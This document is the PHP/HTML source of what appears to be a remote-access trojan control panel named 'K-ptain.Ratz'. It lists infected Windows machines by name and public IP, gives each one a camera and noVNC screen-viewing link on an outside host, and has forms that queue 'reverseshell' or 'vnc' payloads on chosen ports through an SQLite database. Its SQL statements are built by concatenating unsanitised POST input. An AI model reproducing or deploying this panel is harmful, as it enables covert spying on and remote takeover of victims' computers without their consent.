<!doctype html>
<html class="no-js" lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <title>K-ptain.Ratz - Dashboard</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="shortcut icon" type="image/png" href="assets/images/icon/favicon.ico">
    <link rel="stylesheet" href="assets/css/bootstrap.min.css">
    <link rel="stylesheet" href="assets/css/font-awesome.min.css">
    <link rel="stylesheet" href="assets/css/themify-icons.css">
    <link rel="stylesheet" href="assets/css/metisMenu.css">
    <link rel="stylesheet" href="assets/css/owl.carousel.min.css">
    <link rel="stylesheet" href="assets/css/slicknav.min.css">
    <!-- amchart css -->
    <link rel="stylesheet" href="https://www.amcharts.com/lib/3/plugins/export/export.css" type="text/css" media="all" />
    <!-- others css -->
    <link rel="stylesheet" href="assets/css/typography.css">
    <link rel="stylesheet" href="assets/css/default-css.css">
    <link rel="stylesheet" href="assets/css/styles.css">
    <link rel="stylesheet" href="assets/css/responsive.css">
    <!-- modernizr css -->
    <script src="assets/js/vendor/modernizr-2.8.3.min.js"></script>
</head>


<?php
function conn() 
{
try{
    $pdo = new PDO('sqlite:'.dirname(__FILE__).'/datasave.db');
    $pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); // ERRMODE_WARNING | ERRMODE_EXCEPTION | ERRMODE_SILENT
} catch(Exception $e) {
    echo "Impossible d'accéder à la base de données SQLite : ".$e->getMessage();
    die();
}
return $pdo;
}


?>

<?php

function requet1()
{
$pdo = conn();
$stmt = $pdo->prepare('SELECT * FROM user where id = 1');
$stmt->execute();
return $stmt->fetchAll();
}

function requet2()
{
$pdo = conn();
$stmt = $pdo->prepare('SELECT * FROM user where id = 2');
$stmt->execute();
return $stmt->fetchAll();
}

function requet3()
{
$pdo = conn();
$stmt = $pdo->prepare('SELECT * FROM user where id = 3');
$stmt->execute();
return $stmt->fetchAll();
}

function requet4()
{
$pdo = conn();
$stmt = $pdo->prepare('SELECT * FROM user where id = 4');
$stmt->execute();
return $stmt->fetchAll();
}

function insert_payload()
{
$pdo = conn();
$sql = "INSERT INTO user (payload) VALUES (?)";

$stmt = $pdo->prepare('INSERT INTO user (payload) VALUES (?)');
//$stmt= $pdo->prepare($sql);
$stmt->execute([$payload]);
}

?>  

<body>
    <!--[if lt IE 8]>
            <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.</p>
        <![endif]-->
    <!-- preloader area start -->
    <div id="preloader">
        <div class="loader"></div>
    </div>
    <!-- preloader area end -->
    <!-- page container area start -->
    <div class="page-container">
        <!-- sidebar menu area start -->
        <div class="sidebar-menu">
            <div class="sidebar-header">
                <div class="logo">
                    <a href="dashboard.html"><img src="assets/images/icon/logo.png" alt="logo"></a>
                </div>
            </div>
            <div class="main-menu">
                <div class="menu-inner">
                    <nav>
                        <ul class="metismenu" id="menu">
                            <li class="active">
                                <a href="javascript:void(0)" aria-expanded="true"><i class="ti-dashboard"></i><span>dashboard</span></a>
                                <ul class="collapse">
                                    <li class="active"><a href="dashboard.html">K-ptain.Ratz</a></li>
                                </ul>
                            </li>

                            <li>
                                <a href="javascript:void(0)" aria-expanded="true"><i class="ti-layers-alt"></i> <span>Pages</span></a>
                                <ul class="collapse">
                                    <li><a href="login.html">Login</a></li>
                                </ul>
                            </li>
                            <li>
                                <a href="javascript:void(0)" aria-expanded="true"><i class="fa fa-exclamation-triangle"></i>
                                    <span>Error</span></a>
                                <ul class="collapse">
                                    <li><a href="404.html">Error 404</a></li>
                                    <li><a href="403.html">Error 403</a></li>
                                    <li><a href="500.html">Error 500</a></li>
                                </ul>
                            </li>
                        </ul>
                    </nav>
                </div>
            </div>
        </div>
        <!-- sidebar menu area end -->
        <!-- main content area start -->
        <div class="main-content">
            <!-- header area start -->
            <div class="header-area">
                <div class="row align-items-center">
                    <!-- nav and search button -->
                    <div class="col-md-6 col-sm-8 clearfix">
                        <div class="nav-btn pull-left">
                            <span></span>
                            <span></span>
                            <span></span>
                        </div>
                        <div class="search-box pull-left">
                            <form action="#">
                                <input type="text" name="search" placeholder="Search..." required>
                                <i class="ti-search"></i>
                            </form>
                        </div>
                    </div>
                    <!-- profile info & task notification -->
                    <div class="col-md-6 col-sm-4 clearfix">
                        <ul class="notification-area pull-right">
                            <li id="full-view"><i class="ti-fullscreen"></i></li>
                            <li id="full-view-exit"><i class="ti-zoom-out"></i></li>

                             <li class="settings-btn">
                                <i class="ti-settings"></i>
                            </li>
                        </ul>
                    </div>
                </div>
            </div>
            <!-- header area end -->

            <!-- page title area start -->
            <div class="page-title-area">
                <div class="row align-items-center">
                    <div class="col-sm-6">
                        <div class="breadcrumbs-area clearfix">
                            <h4 class="page-title pull-left">Dashboard</h4>
                            <ul class="breadcrumbs pull-left">
                                <li><a href="dashboard.html">Home</a></li>
                                <li><span>Dashboard</span></li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-sm-6 clearfix">
                        <div class="user-profile pull-right">
                            <img class="avatar user-thumb" src="assets/images/author/avatar.png" alt="avatar">
                            <h4 class="user-name dropdown-toggle" data-toggle="dropdown">Admin <i class="fa fa-angle-down"></i></h4>
                            <div class="dropdown-menu">
                                <a class="dropdown-item" href="#">Settings</a>
                                <a class="dropdown-item" href="#">Log Out</a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <!-- page title area end -->
            <div class="main-content-inner">

                <!-- market value area start -->
                <div class="row mt-5 mb-5">
                    <div class="col-12">
                        <div class="card">
                            <div class="card-body">
                                <div class="d-sm-flex justify-content-between align-items-center">
                                    <select class="custome-select border-0 pr-3">
                                        <option selected>Last 24 Hours</option>
                                        <option value="0">01 July 2018</option>
                                    </select>
                                </div>
                                <div class="market-status-table mt-4">
                                    <div class="table-responsive">
                                        <table class="dbkit-table">
                                            <tr class="heading-td">
                                                <td class="mv-icon">Logo</td>
                                                <td class="computer-name">Computer Name</td>
                                                <td class="public-ip">Public IP address</td>
                                                <td class="local-ip">Payload</td>
                                                <td class="os">OS</td>
                                                <td class="last-seen">Camera</td>
                                                <td class="stats-chart">Heartbeat status</td>
                                            </tr>
                                            <tr>
                                                <td class="mv-icon"><img src="assets/images/icon/dashboard/eu.png" alt="icon">
                                                </td>
                                                
                                                
                                                <td class="computer-name"><a href="http://kptain.ratz.rs/gui/noVNC/vnc.html"><?php $first = requet1()[0]; print_r($first['name']); ?> </a </td>
                                                <td class="public-ip"> <?php $first = requet1()[0]; print_r($first['ip']); ?> </td>
                                                <td class="local-ip">
                                                
                                                <form method="post">
                                                <p>
                                                    <select name="payload">
                                                        <option value="empty"></option>
                                                        <option value="vnc">vnc</option>
                                                        <option value="reverseshell">reverseshell</option>
                                                        <option value="">empty</option>
                                                        <option value="">empty</option>
                                                    </select>

                                                    <input type="submit" value="Go" title="valider" /><br>
                                                    <input type="number" name="port" value="Port :">
                                                    </form>
                                               
                                                </p>
                                                
                                                <?php
                                                    if ($_POST['payload'] == 'reverseshell')
                                                    {
                                                    //echo $_POST['port'];
                                                    $pdo = conn();
                                                    $stmt = $pdo->prepare("UPDATE user SET payload = 'reverseshell', port_payload = '".$_POST['port']."' WHERE id = 1;");
                                                    $stmt->execute();

                                                    }
                                                    
                                                    if ($_POST['payload'] == 'vnc')
                                                    {
                                                    $pdo = conn();
                                                    $stmt = $pdo->prepare("UPDATE user SET payload = 'vnc', port_payload = '".$_POST['port']."' WHERE id = 1;");
                                                    $stmt->execute();

                                                    }
                                                ?>
                                                </td>
                                                <td class="os"><img src="assets/images/icon/dashboard/win10.png" alt="icon"></td>
                                                <td class="last-seen"><a href="http://kptain.ratz.rs/gui/noVNC/vnc.html"> <img src="assets/images/icon/camera.ico" alt="icon"> </td>
                                                <td class="stats-chart">
                                                    <canvas id="mvaluechart"></canvas>
                                                </td>
                                            </tr>
                                            <tr>
                                                <td class="mv-icon">
                                                    <div class="mv-icon"><img src="assets/images/icon/dashboard/uk.png" alt="icon"></div>
                                                </td>
                                                <td class="computer-name"><a href="http://kptain.ratz.rs/noVNC/vnc.html"><?php $first = requet2()[0]; print_r($first['name']); ?> </a </td>
                                                <td class="public-ip"> <?php $first = requet2()[0]; print_r($first['ip']); ?> </td>
                                                <td class="local-ip">
                                                <form method="post">
                                                <p>
                                                    <select name="payload1">
                                                        <option value="empty"></option>
                                                        <option value="vnc">vnc</option>
                                                        <option value="reverseshell">reverseshell</option>
                                                        <option value="">empty</option>
                                                        <option value="">empty</option>
                                                    </select>

                                                    <input type="submit" value="Go" title="valider" /><br>
                                                    <input type="number" name="port1" value="Port :">
                                                    </form>
                                               
                                                </p>
                                                
                                                <?php
                                                    if ($_POST['payload1'] == 'reverseshell')
                                                    {
                                                    $pdo = conn();
                                                    $stmt = $pdo->prepare("UPDATE user SET payload = 'reverseshell', port_payload = '".$_POST['port1']."' WHERE id = 2;");
                                                    $stmt->execute();

                                                    }
                                                    if ($_POST['payload1'] == 'vnc')
                                                    {
                                                    $pdo = conn();
                                                    $stmt = $pdo->prepare("UPDATE user SET payload = 'vnc', port_payload = '".$_POST['port1']."' WHERE id = 2;");
                                                    $stmt->execute();

                                                    }
                                                ?>
                                                </td>
                                                <td class="os"><img src="assets/images/icon/dashboard/win10.png" alt="icon"></td>
                                                <td class="last-seen"><a href="http://kptain.ratz.rs/gui/noVNC/vnc.html"> <img src="assets/images/icon/camera.ico" alt="icon"> </td>
                                                <td class="stats-chart">
                                                    <canvas id="mvaluechart2"></canvas>
                                                </td>
                                            </tr>
                                            <tr>
                                                <td class="mv-icon">
                                                    <div class="mv-icon"><img src="assets/images/icon/dashboard/de.png" alt="icon"></div>
                                                </td>
                                                <td class="computer-name"><a href="http://kptain.ratz.rs/noVNC/vnc.html"><?php $first = requet3()[0]; print_r($first['name']); ?> </a </td>
                                                <td class="public-ip"> <?php $first = requet3()[0]; print_r($first['ip']); ?> </td>
                                                <td class="local-ip">
                                                <form method="post">
                                                <p>
                                                    <select name="payload2">
                                                        <option value="empty"></option>
                                                        <option value="vnc">vnc</option>
                                                        <option value="reverseshell">reverseshell</option>
                                                        <option value="">empty</option>
                                                        <option value="">empty</option>
                                                    </select>

                                                    <input type="submit" value="Go" title="valider" /><br>
                                                    <input type="number" name="port2" value="Port :">
                                                    </form>
                                               
                                                </p>
                                                
                                                <?php
                                                    if ($_POST['payload2'] == 'reverseshell')
                                                    {
                                                    $pdo = conn();
                                                    $stmt = $pdo->prepare("UPDATE user SET payload = 'reverseshell', port_payload = '".$_POST['port2']."' WHERE id = 3;");
                                                    $stmt->execute();

                                                    }
                                                    if ($_POST['payload2'] == 'vnc')
                                                    {
                                                    $pdo = conn();
                                                    $stmt = $pdo->prepare("UPDATE user SET payload = 'vnc', port_payload = '".$_POST['port2']."' WHERE id = 3;");
                                                    $stmt->execute();

                                                    }
                                                ?>
                                                </td>
                                                <td class="os"><img src="assets/images/icon/dashboard/win10.png" alt="icon"></td>
                                                <td class="last-seen"><a href="http://kptain.ratz.rs/gui/noVNC/vnc.html"> <img src="assets/images/icon/camera.ico" alt="icon"> </td>
                                                <td class="stats-chart">
                                                    <canvas id="mvaluechart3"></canvas>
                                                </td>
                                            </tr>
                                            <tr>
                                                <td class="mv-icon">
                                                    <div class="mv-icon"><img src="assets/images/icon/dashboard/it.png" alt="icon"></div>
                                                </td>
                                                <td class="computer-name"><a href="http://kptain.ratz.rs/noVNC/vnc.html"><?php $first = requet4()[0]; print_r($first['name']); ?> </a </td>
                                                <td class="public-ip"> <?php $first = requet4()[0]; print_r($first['ip']); ?> </td>
                                                <td class="local-ip">
                                                <form method="post">
                                                <p>
                                                    <select name="payload3">
                                                        <option value="empty"></option>
                                                        <option value="vnc">vnc</option>
                                                        <option value="reverseshell">reverseshell</option>
                                                        <option value="">empty</option>
                                                        <option value="">empty</option>
                                                    </select>

                                                    <input type="submit" value="Go" title="valider" /><br>
                                                    <input type="number" name="port3" value="Port :">
                                                    </form>
                                               
                                                </p>
                                                
                                                <?php
                                                    if ($_POST['payload3'] == 'reverseshell')
                                                    {
                                                    $pdo = conn();
                                                    $stmt = $pdo->prepare("UPDATE user SET payload = 'reverseshell', port_payload = '".$_POST['port3']."' WHERE id = 4;");
                                                    $stmt->execute();

                                                    }
                                                     if ($_POST['payload3'] == 'vnc')
                                                    {
                                                    $pdo = conn();
                                                    $stmt = $pdo->prepare("UPDATE user SET payload = 'vnc', port_payload = '".$_POST['port3']."' WHERE id = 4;");
                                                    $stmt->execute();

                                                    }
                                                ?>
                                                </td>
                                                <td class="os"><img src="assets/images/icon/dashboard/win10.png" alt="icon"></td>
                                                <td class="last-seen"><a href="http://kptain.ratz.rs/gui/noVNC/vnc.html"> <img src="assets/images/icon/camera.ico" alt="icon"> </td>
                                                <td class="stats-chart">
                                                    <canvas id="mvaluechart4"></canvas>
                                                </td>
                                            </tr>
                                        </table>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <!-- market value area end -->


                <!-- row area start-->
            </div>
        </div>
        <!-- main content area end -->
        <!-- footer area start-->
        <footer>
            <div class="footer-area">
            </div>
        </footer>
        <!-- footer area end-->
    </div>
    <!-- page container area end -->

    <!-- jquery latest version -->
    <script src="assets/js/vendor/jquery-2.2.4.min.js"></script>
    <!-- bootstrap 4 js -->
    <script src="assets/js/popper.min.js"></script>
    <script src="assets/js/bootstrap.min.js"></script>
    <script src="assets/js/owl.carousel.min.js"></script>
    <script src="assets/js/metisMenu.min.js"></script>
    <script src="assets/js/jquery.slimscroll.min.js"></script>
    <script src="assets/js/jquery.slicknav.min.js"></script>

    <!-- start chart js -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.7.2/Chart.min.js"></script>
    <!-- start highcharts js -->
    <script src="https://code.highcharts.com/highcharts.js"></script>
    <!-- start zingchart js -->
    <script src="https://cdn.zingchart.com/zingchart.min.js"></script>
    <script>
    zingchart.MODULESDIR = "https://cdn.zingchart.com/modules/";
    ZC.LICENSE = ["569d52cefae586f634c54f86dc99e6a9", "ee6b7db5b51705a13dc2339db3edaf6d"];
    </script>
    <!-- all line chart activation -->
    <script src="assets/js/line-chart.js"></script>
    <!-- all pie chart -->
    <script src="assets/js/pie-chart.js"></script>
    <!-- others plugins -->
    <script src="assets/js/plugins.js"></script>
    <script src="assets/js/scripts.js"></script>
</body>

</html>
